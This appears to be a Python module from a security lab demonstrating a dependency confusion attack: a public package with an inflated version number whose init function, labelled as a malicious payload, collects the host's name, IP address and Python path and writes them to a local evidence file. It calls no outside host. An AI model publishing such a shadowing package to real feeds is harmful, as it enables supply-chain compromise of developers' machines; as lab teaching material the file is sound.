# lab2/public_feed/company_module.py
import socket
import sys

__version__ = "99.0.0"

def init_service():
    print("[MALICIOUS] Service initialized from PUBLIC feed.")
    
    # --- MALICIOUS PAYLOAD ---
    try:
        # Prove execution by grabbing network and environment data
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        python_env = sys.executable
        
        with open("compromise_evidence.txt", "w") as f:
            f.write("--- DEPENDENCY CONFUSION SUCCESSFUL ---\n")
            f.write(f"Target IP Address : {local_ip}\n")
            f.write(f"Python Executable : {python_env}\n")
            f.write("Attacker now has network context.\n")
            f.write("---------------------------------------\n")
    except:
        pass